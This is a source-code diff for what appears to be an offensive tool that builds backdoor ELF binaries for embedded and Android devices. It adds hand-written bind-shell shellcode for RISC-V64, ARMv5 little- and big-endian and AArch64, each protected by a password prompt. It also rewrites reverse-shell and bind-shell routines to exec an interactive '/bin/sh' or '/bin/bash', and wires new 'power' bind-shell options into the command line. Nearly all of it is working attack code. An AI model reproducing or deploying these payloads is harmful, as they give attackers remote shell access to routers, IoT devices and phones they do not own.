@@ -15,6 +15,7 @@ from . import hackebds_cmd
 import string
 from . import my_package
 from . import power_reverse_shell
+from . import power_bind_shell
 
 chars = string.ascii_letters
 
@@ -793,6 +794,8 @@ def armelv5_backdoor(shell_path ,reverse_ip,reverse_port, envp,filename=None):
 				context.endian="little"
 			else:
 				return 
+
+
 def armelv5_reverse_sl(reverse_ip,reverse_port):
 	context.bits="32"
 	context.arch='arm'
@@ -2393,13 +2396,94 @@ def android_aarch64_backdoor(shell_path ,reverse_ip,reverse_port, envp ,filename
 	log.success("reverse_port is: "+str(reverse_port))
 	shell_path_list = []
 	if shell_path == "/bin/bash" or shell_path == "bash":
-		shell_path = "/system/bin/bash"
-		shell_path_list.append(shell_path)
-		shell_path_list.append("-i")
+		shellcode_execve = '''
+/* execve(path='/bin/bash', argv=['/bin/bash', '-i'], envp=0) */
+/* push b'/bin/bash\x00' */
+/* Set x14 = 8314034342958031407 = 0x7361622f6e69622f */
+mov  x14, #25135
+movk x14, #28265, lsl #16
+movk x14, #25135, lsl #0x20
+movk x14, #29537, lsl #0x30
+mov  x15, #104
+stp x14, x15, [sp, #-16]!
+mov  x0, sp
+/* push argument array [b'/bin/bash\x00', b'-i\x00'] */
+/* push b'/bin/bash\x00-i\x00' */
+/* Set x14 = 8314034342958031407 = 0x7361622f6e69622f */
+mov  x14, #25135
+movk x14, #28265, lsl #16
+movk x14, #25135, lsl #0x20
+movk x14, #29537, lsl #0x30
+/* Set x15 = 1764556904 = 0x692d0068 */
+mov  x15, #104
+movk x15, #26925, lsl #16
+stp x14, x15, [sp, #-16]!
+
+/* push null terminator */
+mov  x14, xzr
+str x14, [sp, #-8]!
+
+/* push pointers onto the stack */
+mov  x14, #18
+add x14, sp, x14
+sub sp, sp ,8
+str x14, [sp, #-8]!
+mov  x14, #24
+add x14, sp, x14
+sub sp, sp, 8
+stp x5, x14 , [sp, #-8]!
+
+add x1, sp, 8
+
+/* set x1 to the current top of the stack */
+mov  x2, xzr
+/* call execve() */
+mov  x8, #0xdd
+svc 0
+
+		'''
 	elif shell_path == "/bin/sh" or shell_path == "sh":
-		shell_path = "/system/bin/sh"
-		shell_path_list.append(shell_path)
-		shell_path_list.append("-i")
+		shellcode_execve ='''
+mov  x14, #25135
+movk x14, #28265, lsl #16
+movk x14, #29487, lsl #0x20
+movk x14, #104, lsl #0x30
+str x14, [sp, #-16]!
+mov  x0, sp
+/* push argument array [b'/bin/sh\x00', b'-i\x00'] */
+/* push b'/bin/sh\x00-i\x00' */
+/* Set x14 = 29400045130965551 = 0x68732f6e69622f */
+mov  x14, #25135
+movk x14, #28265, lsl #16
+movk x14, #29487, lsl #0x20
+movk x14, #104, lsl #0x30
+mov  x15, #26925
+stp x14, x15, [sp, #-16]!
+
+/* push null terminator */
+mov  x14, xzr
+str x14, [sp, #-8]!
+
+/* push pointers onto the stack */
+mov  x14, #16
+add x14, sp, x14
+sub sp, sp, 8
+
+str x14, [sp, #-8]! /* b'/bin/sh\x00' */
+mov  x14, #24
+add x14, sp, x14
+sub sp, sp, 8
+str x14, [sp, #0]! /* b'-i\x00' */
+
+mov x1, sp
+
+/* set x1 to the current top of the stack */
+mov  x2, xzr
+/* call execve() */
+mov  x8, #0xdd
+svc 0
+
+		'''
 	else:
 		log.info("now shell is only support sh and bash")
 		return 
@@ -2407,6 +2491,7 @@ def android_aarch64_backdoor(shell_path ,reverse_ip,reverse_port, envp ,filename
 		envp = 0
 	else:
 		envp = my_package.get_envir_args(envp)
+
 	basic_shellcode=asm(shellcraft.connect(reverse_ip,reverse_port))
 	shellcode2='''
 	mov x0,x12
@@ -2422,7 +2507,7 @@ def android_aarch64_backdoor(shell_path ,reverse_ip,reverse_port, envp ,filename
 	svc #1337
 	'''
 	shellcode2=asm(shellcode2)
-	shellcode3=asm(shellcraft.execve(shell_path, shell_path_list, envp))
+	shellcode3=asm(shellcode_execve)
 	all_reverseshell=basic_shellcode+shellcode2+shellcode3
 	#all_reverseshell=shellcode3
 	ELF_data = make_elf(all_reverseshell)
@@ -3435,6 +3520,7 @@ def aarch64_bind_shell(listen_port, passwd, filename = None):
 	movk x14, #25719, lsl #0x20
 	movk x14, #8250, lsl #0x30
 	mov  x15, xzr
+	sub  sp, sp, #8
 	stp x14, x15, [sp, #-16]!
 	mov  x1, sp
 	mvn  x0, x4
@@ -3459,7 +3545,42 @@ def aarch64_bind_shell(listen_port, passwd, filename = None):
 	cmp x15, x14
 	bne 0x1888
 	'''
-	shellcode += shellcraft.execve("/bin/sh",['/bin/sh'],0)
+	shellcode += '''
+mov  x14, #25135
+movk x14, #28265, lsl #16
+movk x14, #29487, lsl #0x20
+movk x14, #104, lsl #0x30
+str x14, [sp, #-16]!
+mov  x0, sp
+/* push argument array [b'/bin/sh\x00', b'-i\x00'] */
+/* push b'/bin/sh\x00-i\x00' */
+/* Set x14 = 29400045130965551 = 0x68732f6e69622f */
+mov  x14, #25135
+movk x14, #28265, lsl #16
+movk x14, #29487, lsl #0x20
+movk x14, #104, lsl #0x30
+mov  x15, #26925
+stp x14, x15, [sp, #-16]!
+
+/* push null terminator */
+mov  x14, xzr
+str x14, [sp, #-8]!
+
+/* push pointers onto the stack */
+mov  x14, #24
+add x14, sp, x14
+sub sp, sp, 8
+str x14, [sp, #0]! /* b'-i\x00' */
+
+mov x1, sp
+
+/* set x1 to the current top of the stack */
+mov  x2, xzr
+/* call execve() */
+mov  x8, #0xdd
+svc 0
+
+	'''
 	shellcode = asm(shellcode % (listen_port, passwd_len, passwd_low2, passwd_low, passwd_high2, passwd_high))
 	ELF_data =make_elf(shellcode)
 	if(filename==None):
@@ -3854,6 +3975,7 @@ def android_aarch64_bindshell(listen_port, passwd, filename):
 	movk x14, #25719, lsl #0x20
 	movk x14, #8250, lsl #0x30
 	mov  x15, xzr
+	sub  sp, sp, #8
 	stp x14, x15, [sp, #-16]!
 	mov  x1, sp
 	mvn  x0, x4
@@ -3878,7 +4000,50 @@ def android_aarch64_bindshell(listen_port, passwd, filename):
 	cmp x15, x14
 	bne 0x1888
 	'''
-	shellcode += shellcraft.execve("/system/bin/sh",0,0)
+
+
+	shellcode_execve ='''
+mov  x14, #25135
+movk x14, #28265, lsl #16
+movk x14, #29487, lsl #0x20
+movk x14, #104, lsl #0x30
+str x14, [sp, #-16]!
+mov  x0, sp
+/* push argument array [b'/bin/sh\x00', b'-i\x00'] */
+/* push b'/bin/sh\x00-i\x00' */
+/* Set x14 = 29400045130965551 = 0x68732f6e69622f */
+mov  x14, #25135
+movk x14, #28265, lsl #16
+movk x14, #29487, lsl #0x20
+movk x14, #104, lsl #0x30
+mov  x15, #26925
+stp x14, x15, [sp, #-16]!
+
+/* push null terminator */
+mov  x14, xzr
+str x14, [sp, #-8]!
+
+/* push pointers onto the stack */
+mov  x14, #16
+add x14, sp, x14
+sub sp, sp, 8
+
+str x14, [sp, #-8]! /* b'/bin/sh\x00' */
+mov  x14, #24
+add x14, sp, x14
+sub sp, sp, 8
+str x14, [sp, #0]! /* b'-i\x00' */
+
+mov x1, sp
+
+/* set x1 to the current top of the stack */
+mov  x2, xzr
+/* call execve() */
+mov  x8, #0xdd
+svc 0
+
+	'''
+	shellcode = shellcode + shellcode_execve
 	shellcode = asm(shellcode % (listen_port, passwd_len, passwd_low2, passwd_low, passwd_high2, passwd_high))
 	ELF_data =make_elf(shellcode)
 	if(filename==None):
@@ -3922,6 +4087,590 @@ def android_aarch64_bindshell(listen_port, passwd, filename):
 			else:
 				return 
 
+
+
+
+
+
+'''
+0xc8 bind
+0xc9 listen
+0xca accept
+0xd0 setsockopt
+0x24 dup2
+0x40 wirte
+0x3f read
+
+'''
+
+
+def riscv64el_bind_shell(listen_port, passwd, filename=None):
+	context.arch = 'riscv'
+	context.endian = 'little'
+	context.bits = '64'
+	log.success("bind port is set to "+ str(listen_port))
+	log.success("passwd is set to '%s'"%passwd )
+	listen_port="0x"+enhex(p16(listen_port))+"0002"
+	passwd_len = hex(len(passwd))
+	#passwd = '0x'+enhex(p64(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).rjust(16,"0")
+	passwd = "0x"+enhex(p64(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).rjust(16,"0")
+	shellcode = '''
+.section .shellcode,"awx"
+.global _start
+.global __start
+.p2align 2
+_start:
+__start:
+li  a0,2
+li  a1,1
+li  a2,0
+li  a7,0xc6
+ecall
+mv  a6, a0
+li  s1, %s
+sd  s1,-16(sp)
+li  s1, 0
+sd  s1, -8(sp)
+add a1,sp,-16
+li  a2, 0x10
+li  a7, 0xc8
+ecall
+mv  a0, a6
+li  a1, 0x2
+li  a7, 0xc9
+ecall
+mv  a0, a6
+li  a1, 0
+li  a2, 0
+li  a7, 0xca
+ecall
+
+mv  a6, a0
+li  a1, 0
+li  a2, 0
+li  a7, 24
+ecall
+
+mv  a0, a6
+li  a1, 1
+li  a2, 0
+li  a7, 24
+ecall
+
+mv  a0, a6
+li  a1, 2
+li  a2, 0
+li  a7, 24
+ecall
+
+add sp, sp, -0x20
+li  s1, 0x203a647773736150
+sd  s1, 0(sp)
+add  a1, sp, 0
+mv  a0, a6
+li  a2, 8
+li  a7, 0x40
+ecall
+
+li  s9, %s
+
+add sp, sp, -0x40
+mv  a1, sp
+mv  a0, a6
+li  a2, %s
+li  a7, 0x3f
+ecall
+
+ld  s8, 0(sp)
+sext.w s8, s8
+sext.w s9, s9
+bne    s8, s9, main_exit
+	'''
+
+	shellcode = shellcode%(listen_port, passwd, passwd_len)
+
+	shellcode += '''
+li s1, 0x68732f2f6e69622f
+sd s1, -48(sp)
+li s1, 0x692d
+sd s1, -64(sp)
+addi a0,sp,-48
+sd a0, -16(sp)
+addi a5,sp,-64
+sd a5, -8(sp)
+sd zero, 0(sp)
+addi a1,sp,-16
+slt a2,zero,-1 
+li a7, 221
+ecall
+		'''
+	
+	shellcode +='''
+main_exit:
+li a0, 0 
+li a7, 0x53
+ecall
+	'''
+	if(filename==None):
+		log.info("waiting 3s")
+		sleep(1)
+		filename=context.arch + "-bind_shell-" + my_package.random_string_generator(4,chars)
+		my_package.my_make_elf(shellcode,filename)
+		log.success("{} is ok in current path ./".format(filename))
+		context.arch = 'i386'
+		context.bits = "32"
+		context.endian = "little"
+	else:
+		if(os.path.exists(filename) != True):
+			log.info("waiting 3s")
+			sleep(1)
+			my_package.my_make_elf(shellcode, filename)
+			log.success("{} generated successfully".format(filename))
+			context.arch='i386'
+			context.bits="32"
+			context.endian="little"
+		else:
+			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
+			choise = input()
+			if choise == "y\n" or choise == "\n":
+				log.info("waiting 3s")
+				sleep(1)
+				my_package.my_make_elf(shellcode, filename)
+				log.success("{} generated successfully".format(filename))
+				context.arch='i386'
+				context.bits="32"
+				context.endian="little"
+			else:
+				return 
+
+
+
+def armelv5_bind_shell(listen_port, passwd, filename=None):
+	context.arch = 'arm'
+	context.endian = 'little'
+	context.bits = '32'
+	log.success("bind port is set to "+ str(listen_port))
+	log.success("passwd is set to '%s'"%passwd )
+	bind_shellcode = 'mov  r6, r0'
+	for i in range(2):
+		bind_shellcode += '''
+		mov  r7,%d
+		strb  r7,[sp,#-%d]
+		'''%(p16(listen_port)[i], 0x60+i)
+	bind_shellcode += '''
+	strb r2,[sp, #-0x62]
+	mov r7, #2
+	strb r7,[sp, #-0x63]	
+	ldr r7,[sp, #-0x63]
+	push {r2}
+	push {r7}
+	'''
+
+	passwd_len_int = len(passwd)
+	passwd_len = hex(len(passwd))
+	passwd_cmd = p32(int("0x"+enhex(passwd.encode()),16))
+	passwd = "0x"+enhex(p32(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).rjust(8,"0")
+	pass_cmd_shellcode = 'eor r7, r7, r7'
+
+	if(passwd_len_int >0 and passwd_len_int <=4):
+		for i in range(4-passwd_len_int):
+			pass_cmd_shellcode += '''
+			strb r7 , [sp, #-%d]
+			'''%(0x80+i)
+
+	for i in range(passwd_len_int):
+		pass_cmd_shellcode += '''
+		mov r7, #%d
+		strb r7, [sp, #-%d]
+		'''%(passwd_cmd[i],0x80+i+(4-passwd_len_int))
+
+	pass_cmd_shellcode += '''
+	ldr r5, [sp, #-0x83]
+	'''
+
+	shellcode = '''
+	.section .shellcode,"awx"
+	.global _start
+	.global __start
+	.p2align 2
+	_start:
+	__start:
+	.syntax unified
+	.arch armv7-a
+	.ARM
+	eor  r4,r4,r4
+	strb r4,[sp,#-0x14]
+	mov r7,#0x68
+	strb r7,[sp,#-0x15]
+	mov r7,#0x73
+	strb r7,[sp,#-0x16]
+	mov r7,#0x2f
+	strb r7,[sp,#-0x17]
+	mov r7,#0x6e
+	strb r7,[sp,#-0x18]
+	mov r7,#0x69
+	strb r7,[sp,#-0x19]
+	mov r7,#0x62
+	strb r7,[sp,#-0x1a]
+	mov r7,#0x2f
+	strb r7,[sp,#-0x1b]
+	eor r7, r7
+	strb r7,[sp,#-0x1e]
+	mov r7,#0x69
+	strb r7,[sp,#-0x1f]
+	mov r7,#0x2d
+	strb r7,[sp,#-0x20]
+	add r8,sp,#-0x20
+	add r4,sp,#-0x1b
+	add r5,sp,#-0x2c
+	add r3,pc,#1
+	bx  r3
+	.THUMB
+	'''
+
+	shellcode += '''
+	mov  r0, #2
+    mov  r1, #1
+    eor  r2, r2 ,r2/* 0 (#0) */
+    /* call socket() */
+    mov r7, #SYS_socket /* 0x119 */
+    svc  #0
+	'''
+
+	shellcode += bind_shellcode
+
+	shellcode +='''
+	mov  r1,sp
+	mov  r2,#0x10  
+	mov r7, 0x11a
+	svc #0
+	mov r0,r6
+	eor r1,r1
+	mov r7,#284
+	svc #0
+	mov r0,r6
+	eor r2,r2
+	mov r7, 0x11d
+    svc #0
+    mov r6,r0
+	mov r7,#0x20
+	strb r7,[sp,#-0x30]
+	mov r7,#0x3a
+	strb r7,[sp,#-0x31]
+	mov r7,#0x64
+	strb r7,[sp,#-0x32]
+	mov r7,#0x77
+	strb r7,[sp,#-0x33]
+	mov r7,#0x73
+	strb r7,[sp,#-0x34]
+	mov r7,0x73
+	strb r7,[sp,#-0x35]
+	mov r7,0x61
+	strb r7,[sp,#-0x36]
+	mov r7,0x70
+	strb r7,[sp,#-0x37]
+	add r1,sp,-0x37
+	mov r0,r6
+	mov  r0, r6
+	mov  r2, #8
+	/* call write() */
+	mov r7, #SYS_write /* 4 */
+	svc  #0
+	sub  sp, 0x20
+	mov  r0, r6
+	mov  r1, sp
+	mov  r2, #%s
+	mov  r7, #3
+	svc  #0
+	mov r0,r6
+	eor r1,r1,r1
+	mov r7,#63
+	svc #1
+	mov r0,r6
+	add r1,r1,#1
+	svc #1
+	mov r0,r6
+	add r1,r1,#1
+	svc #1
+	mov  r7,sp
+	ldr  r1,[r7]
+	'''
+
+	shellcode += pass_cmd_shellcode
+
+	shellcode += '''
+	cmp  r1,r5
+	bne  main_exit
+	mov r0,r4
+	eor r1,r1,r1
+	eor r2,r2,r2
+	strb r2, [sp,#0x20]
+	push {r1}
+	push {r0,r8}
+	mov r1,sp
+	mov r7,#0xb
+	svc #1
+	'''
+	shellcode = shellcode % ( passwd_len)
+
+
+	shellcode += '''
+main_exit:
+	'''
+
+	shellcode += shellcraft.exit(0)
+
+
+	if(filename==None):
+		log.info("waiting 3s")
+		sleep(1)
+		filename=context.arch + "-bind_shell-" + my_package.random_string_generator(4,chars)
+		my_package.my_make_elf(shellcode, filename)
+		log.success("{} is ok in current path ./".format(filename))
+		context.arch = 'i386'
+		context.bits = "32"
+		context.endian = "little"
+	else:
+		if(os.path.exists(filename) != True):
+			log.info("waiting 3s")
+			sleep(1)
+			my_package.my_make_elf(shellcode, filename)
+			log.success("{} generated successfully".format(filename))
+			context.arch='i386'
+			context.bits="32"
+			context.endian="little"
+		else:
+			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
+			choise = input()
+			if choise == "y\n" or choise == "\n":
+				log.info("waiting 3s")
+				sleep(1)
+				my_package.my_make_elf(shellcode, filename)
+				log.success("{} generated successfully".format(filename))
+				context.arch='i386'
+				context.bits="32"
+				context.endian="little"
+			else:
+				return 
+
+
+def armebv5_bind_shell(listen_port, passwd, filename=None):
+	context.arch = 'arm'
+	context.endian = 'big'
+	context.bits = '32'
+	log.success("bind port is set to "+ str(listen_port))
+	log.success("passwd is set to '%s'"%passwd )
+
+	l_p =p16(listen_port)[::-1]
+
+	bind_shellcode = 'mov  r6, r0'
+	for i in range(2):
+		bind_shellcode += '''
+		mov  r7,%d
+		strb  r7,[sp,#-%d]
+		'''%(l_p[i], 0x60+i)
+	bind_shellcode += '''
+	strb r2,[sp, #-0x63]
+	mov r7, #2
+	strb r7,[sp, #-0x62]	
+	ldr r7,[sp, #-0x63]
+	push {r2}
+	push {r7}
+	'''
+
+	passwd_len_int = len(passwd)
+	passwd_len = hex(len(passwd))
+	passwd_cmd = p32(int("0x"+enhex(passwd.encode()),16))[::-1]
+	passwd = "0x"+enhex(p32(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).ljust(8,"0")
+	pass_cmd_shellcode = 'eor r7, r7, r7'
+	if(passwd_len_int >0 and passwd_len_int <=4):
+		for i in range(4-passwd_len_int):
+			pass_cmd_shellcode += '''
+			strb r7 , [sp, #-%d]
+			'''%(0x80+i)
+	for i in range(passwd_len_int):
+		pass_cmd_shellcode += '''
+		mov r7, #%d
+		strb r7, [sp, #-%d]
+		'''%(passwd_cmd[i],0x80+i+(4-passwd_len_int))
+
+	pass_cmd_shellcode += '''
+	ldr r5, [sp, #-0x83]
+	'''
+
+
+	shellcode = '''
+	.section .shellcode,"awx"
+	.global _start
+	.global __start
+	.p2align 2
+	_start:
+	__start:
+	.syntax unified
+	.arch armv7-a
+	.ARM
+	eor r4,r4,r4
+	strb r4,[sp,#-0x14]
+	mov r7,#0x68
+	strb r7,[sp,#-0x15]
+	mov r7,#0x73
+	strb r7,[sp,#-0x16]
+	mov r7,#0x2f
+	strb r7,[sp,#-0x17]
+	mov r7,#0x6e
+	strb r7,[sp,#-0x18]
+	mov r7,#0x69
+	strb r7,[sp,#-0x19]
+	mov r7,#0x62
+	strb r7,[sp,#-0x1a]
+	mov r7,#0x2f
+	strb r7,[sp,#-0x1b]
+	eor r7, r7
+	strb r7,[sp,#-0x1e]
+	mov r7,#0x69
+	strb r7,[sp,#-0x1f]
+	mov r7,#0x2d
+	strb r7,[sp,#-0x20]
+	add r8,sp,#-0x20
+	add r4,sp,#-0x1b
+	add r5,sp,#-0x2c
+	add r3,pc,#1
+	bx  r3
+	.THUMB
+	'''
+
+	shellcode += '''
+	mov  r0, #2
+    mov  r1, #1
+    eor  r2, r2 ,r2/* 0 (#0) */
+    /* call socket() */
+    mov r7, #SYS_socket /* 0x119 */
+    svc  #0
+	'''
+
+	shellcode += bind_shellcode
+
+	shellcode += '''
+	mov  r1,sp
+	mov  r2,#0x10  
+	mov r7, 0x11a
+	svc #0
+	mov r0,r6
+	eor r1,r1
+	mov r7,#284
+	svc #0
+	mov r0,r6
+	eor r2,r2
+	mov r7, 0x11d
+	svc #0
+	mov r6,r0
+
+	mov r1,#2
+	mov r0,r6
+	mov r7,#63
+	svc #0
+	sub r1, r1, #1
+	mov r0, r6
+	mov r7,#63
+	svc #0
+	sub r1, r1, #1
+	mov r0, r6
+	mov r7, 63
+	svc #0
+
+	mov r7,#0x20
+	strb r7,[sp,#-0x30]
+	mov r7,#0x3a
+	strb r7,[sp,#-0x31]
+	mov r7,#0x64
+	strb r7,[sp,#-0x32]
+	mov r7,#0x77
+	strb r7,[sp,#-0x33]
+	mov r7,#0x73
+	strb r7,[sp,#-0x34]
+	mov r7,0x73
+	strb r7,[sp,#-0x35]
+	mov r7,0x61
+	strb r7,[sp,#-0x36]
+	mov r7,0x70
+	strb r7,[sp,#-0x37]
+	add r1,sp,-0x37
+	mov r0,r6
+	mov  r0, r6
+	mov  r2, #8
+	/* call write() */
+	mov r7, #SYS_write /* 4 */
+	svc  #0
+	sub  sp, 0x20
+	mov  r0, r6
+	mov  r1, sp
+	mov  r2, #%s
+	mov  r7, #3
+	svc  #0
+	mov  r7,sp
+	ldr  r1,[r7]
+	'''
+	
+	shellcode += pass_cmd_shellcode
+
+	shellcode +='''
+	cmp  r1,r5
+	'''
+	shellcode = shellcode%(passwd_len)
+
+	shellcode += '''
+	bne main_exit
+	'''
+
+	shellcode += '''
+	mov r0,r4
+	eor r1,r1,r1
+	eor r2,r2,r2
+	strb r2, [sp,#0x20]
+	push {r1}
+	push {r0,r8}
+	mov r1,sp
+	mov r7,#0xb
+	svc #1
+	'''
+
+	shellcode += '''
+	main_exit:
+	'''
+
+	shellcode += shellcraft.exit(0)
+
+	if(filename==None):
+		log.info("waiting 3s")
+		sleep(1)
+		filename=context.arch + "-bind_shell-" + my_package.random_string_generator(4,chars)
+		my_package.my_make_elf(shellcode, filename)
+		log.success("{} is ok in current path ./".format(filename))
+		context.arch = 'i386'
+		context.bits = "32"
+		context.endian = "little"
+	else:
+		if(os.path.exists(filename) != True):
+			log.info("waiting 3s")
+			sleep(1)
+			my_package.my_make_elf(shellcode, filename)
+			log.success("{} generated successfully".format(filename))
+			context.arch='i386'
+			context.bits="32"
+			context.endian="little"
+		else:
+			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
+			choise = input()
+			if choise == "y\n" or choise == "\n":
+				log.info("waiting 3s")
+				sleep(1)
+				my_package.my_make_elf(shellcode, filename)
+				log.success("{} generated successfully".format(filename))
+				context.arch='i386'
+				context.bits="32"
+				context.endian="little"
+			else:
+				return 
 
 
 
@@ -4082,7 +4831,7 @@ def test1():
 '''
 
 def get_version():
-    return Fore.GREEN+"Version: 0.3.1"+Fore.RESET
+    return Fore.GREEN+"Version: 0.3.3"+Fore.RESET
 
 
 '''
@@ -4168,15 +4917,15 @@ bind_shell_dic = {
 	2: mipsel_bind_shell,
 	3: mips64_bind_shell,
 	4: mips64el_bind_shell,
-	5: None,
+	5: armelv5_bind_shell,
 	6: armelv7_bind_shell,
-	7: None,
+	7: armebv5_bind_shell,
 	8: armv7eb_bind_shell,
 	9: aarch64_bind_shell,
 	10: x86_bind_shell,
 	11: x64_bind_shell,
 	12: android_aarch64_bindshell,
-	13: None,
+	13: riscv64el_bind_shell,
 	14: powerpc_info.powerpc_bind_shell,
 	15: None,
 	16: None,
@@ -4191,9 +4940,9 @@ power_reverse_shell = {
 	2: power_reverse_shell.mipsel_power_reverse_shell,
 	3: power_reverse_shell.mips64_power_reverse_shell,
 	4: power_reverse_shell.mips64el_power_reverse_shell,
-	5: None,
+	5: power_reverse_shell.armelv5_power_reverse_shell,
 	6: power_reverse_shell.armelv7_power_reverse_shell,
-	7: None,
+	7: power_reverse_shell.armebv5_power_reverse_shell,
 	8: power_reverse_shell.armebv7_power_reverse_shell,
 	9: power_reverse_shell.aarch64_power_reverse_shell,
 	10: power_reverse_shell.x86_power_reverse_shell,
@@ -4209,6 +4958,23 @@ power_reverse_shell = {
 	20: power_reverse_shell.sparc64_power_reverse_shell
 }
 
+
+power_bind_shell_dic = {
+	1: power_bind_shell.mips_power_bind_shell,
+	2: power_bind_shell.mipsel_power_bind_shell,
+	3: power_bind_shell.mips64_power_bind_shell,
+	4: power_bind_shell.mips64el_power_bind_shell,
+	5: power_bind_shell.armelv5_power_bind_shell,
+	6: power_bind_shell.armelv7_power_bind_shell,
+	7: power_bind_shell.armebv5_power_bind_shell,
+	8: power_bind_shell.armebv7_power_bind_shell,
+	9: power_bind_shell.aarch64_power_bind_shell,
+	10: power_bind_shell.x86_power_bind_shell,
+	11: power_bind_shell.x64_power_bind_shell,
+	12: power_bind_shell.android_power_bind_shell,
+	13: power_bind_shell.riscv64_power_bind_shell,
+	14: None
+}
 
 
 
@@ -4266,6 +5032,10 @@ def num_get_power_reverse_shell(num, shell_path ,reverse_ip, reverse_port, envp 
 	fun = power_reverse_shell.get(num)
 	return fun(shell_path, reverse_ip, reverse_port, envp,filename)
 
+def num_get_power_bind_shell(num, shell_path, listen_port, passwd, envp,filename):
+	fun = power_bind_shell_dic.get(num)
+	return fun(shell_path, listen_port, passwd, envp,filename)
+
 
 def check_ip(strip):
 	try:
@@ -4295,7 +5065,7 @@ def main():
 	parser.add_argument('-cmd', required=False, type=str,default=None, help='Commands executed')
 	parser.add_argument('-envp', required=False, type=str,default=None, help='Commands envp')
 	parser.add_argument('-encode', '--encode' ,action='store_true', help='encode backdoor')
-	parser.add_argument('-power', '--power' ,action='store_true',help='powerful reverse shell')
+	parser.add_argument('-power', '--power' ,action='store_true',help='powerful reverse shell_file or bind_shell file')
 	parser.add_argument('-l', '--list' ,action='store_true',help='print model list')
 	parser.add_argument('-v', '--version' ,action='version', version=get_version(), help='Display version')
 	#envp
@@ -4407,10 +5177,14 @@ def main():
 	if (args.res == "bind_shell"):
 		try:
 			if (args.passwd!=None and args.bind_port != None and args.arch!=None and args.encode == False ):
-	
-				if (check_port(args.reverse_port)==True):
-					num_getbind_shell(arch_get_number(args.arch), args.bind_port, args.passwd, args.filename)
-					return 
+				if (check_port(args.bind_port)==True):				
+					if (args.power == True):
+						num_get_power_bind_shell(arch_get_number(args.arch), args.shell ,args.bind_port, args.passwd, args.envp ,args.filename)
+						return 
+						
+					else:	
+						num_getbind_shell(arch_get_number(args.arch), args.bind_port, args.passwd, args.filename)
+						return 
 				else:
 					log.info("PORT format error")
 					return 
